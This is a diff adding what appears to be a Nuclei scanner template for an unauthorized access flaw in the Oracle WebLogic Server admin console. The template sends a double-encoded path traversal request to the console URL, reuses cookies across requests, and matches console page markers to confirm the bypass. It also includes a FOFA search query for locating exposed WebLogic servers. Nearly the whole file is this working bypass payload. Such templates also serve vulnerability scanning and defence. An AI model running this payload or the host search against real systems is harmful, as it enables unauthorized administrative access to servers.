@@ -1,0 +1,43 @@
+id: Oracle-Weblogic-Server-UnauthorizedAccess
+info:
+  name: WebLogic未授权访问
+  author: wjlin0
+  severity: critical
+  description: 漏洞允许未授权的用户绕过管理控制台的权限验证访问后台
+  metadata:
+    fofa-dork: 'app="WebLogic-Server"'
+  reference:
+    - https://
+  tags: weblogic,oracle,UnauthorizedAccess
+http:
+  - raw:
+      - |+
+        GET /console/css/%252e%252e%252fconsole.portal HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+      - |+
+        GET /console/css/%252e%252e%252fconsole.portal HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+    cookie-reuse: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - WebLogic Server
+          - wlsc-titlebar-title-panel
+          - float-container
+          - wlsc-book-content
+          - console.startAdHocRecord
+        condition: and
